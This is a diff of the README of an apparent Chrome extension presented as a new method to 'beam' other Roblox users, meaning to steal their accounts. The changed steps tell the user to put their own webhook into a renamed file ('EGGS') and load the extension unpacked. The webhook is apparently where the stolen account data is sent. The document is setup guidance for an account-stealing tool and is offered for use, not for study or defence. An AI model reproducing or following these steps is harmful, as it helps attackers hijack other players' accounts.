@@ -5,9 +5,9 @@ THIS IS A VERY NEW METHOD, PLEASE SHARE WITH ANYONE YOU THINK IS COMPATIBLE WITH
 
 **INSTALLATION: Step 1: Download the files inorder to make the extension**
 
-**Step 2: Open the folder "extension" and then open the text file called "webhook"**
+**Step 2: Open the folder "extension" and then open the text file called "EGGS"**
 
-**Step 3: In order for you to beam other roblox users you must replace the "WEBHOOK HERE" then click file, then save**
+**Step 3: In order for you to beam other roblox users you must replace the "YOUR WEBHOOK" then click file, then save**
 
 **Step 4: Go to chrome://extensions/ and click load unpacked**
 
